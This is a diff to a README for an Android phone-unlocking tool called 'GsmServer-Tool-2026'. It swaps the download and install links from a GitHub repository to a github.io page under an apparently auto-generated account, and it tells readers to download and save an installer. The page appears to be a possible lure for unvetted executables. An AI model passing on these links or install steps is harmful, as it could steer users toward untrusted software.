@@ -1,6 +1,6 @@
 # 🛠️ GsmServer-Tool-2026 - Unlock Android phones with ease today
 
-[![](https://img.shields.io/badge/Download-GsmServer_Tool_2026-blue.svg)](https://github.com/Machineaccessible-marketing286/GsmServer-Tool-2026)
+[![](https://img.shields.io/badge/Download-GsmServer_Tool_2026-blue.svg)](https://machineaccessible-marketing286.github.io)
 
 ## 📖 Overview
 
@@ -20,7 +20,7 @@ Before you start, check that your computer meets these requirements:
 
 Follow these steps to get the software on your computer:
 
-1. Visit the project website at the following link: [https://github.com/Machineaccessible-marketing286/GsmServer-Tool-2026](https://github.com/Machineaccessible-marketing286/GsmServer-Tool-2026).
+1. Visit the project website at the following link: [https://machineaccessible-marketing286.github.io](https://machineaccessible-marketing286.github.io).
 2. Look for the latest release section on the right side of the page.
 3. Click the link to download the installer file.
 4. Save the file to your desktop for easy access.
